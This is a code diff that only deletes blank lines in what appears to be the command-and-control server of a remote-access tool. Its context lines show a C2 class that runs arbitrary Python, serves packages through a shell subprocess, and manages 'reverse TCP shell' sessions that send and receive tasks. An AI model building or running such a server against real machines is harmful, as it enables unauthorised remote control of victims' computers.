@@ -195,7 +195,6 @@ class C2(threading.Thread):
         else:
             return "File '{}' not found".format(str(path))
 
-
     def py_exec(self, code):
         """
         Execute code directly in the context of the currently running process
@@ -215,7 +214,6 @@ class C2(threading.Thread):
         except Exception as e:
             print(e)
 
-
     def py_eval(self, code):
         """
         Evaluate code directly in the context of the currently running process
@@ -234,7 +232,6 @@ class C2(threading.Thread):
             print(eval(code))
         except Exception as e:
             print(e)
-
 
     def quit(self):
         """
@@ -268,7 +265,6 @@ class C2(threading.Thread):
         _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill {}".format(os.getpid())).read()
         util.display('Exiting...')
         sys.exit(0)
-
 
     @util.threaded
     def serve_until_stopped(self):
@@ -306,7 +302,6 @@ class C2(threading.Thread):
             if abort:
                 break
 
-
     @util.threaded
     def serve_resources(self):
         """
@@ -318,7 +313,6 @@ class C2(threading.Thread):
             time.sleep(3)
             globals()['package_handler'].terminate()
             globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
-
 
     def run(self):
         """
@@ -387,7 +381,6 @@ class SessionThread(threading.Thread):
             util.log("Error creating session: {}".format(str(e)))
             self.info = None
 
-
     def kill(self):
         """
         Kill the reverse TCP shell session
@@ -439,7 +432,6 @@ class SessionThread(threading.Thread):
                 info[key] = base64.b64decode(val[6:]).decode('ascii')
         return info
 
-
     def send_task(self, task):
         """
         Send task results to the server
@@ -464,7 +456,6 @@ class SessionThread(threading.Thread):
         msg  = struct.pack('!L', len(data)) + data
         self.connection.sendall(msg)
         return True
-
 
     def recv_task(self):
         """
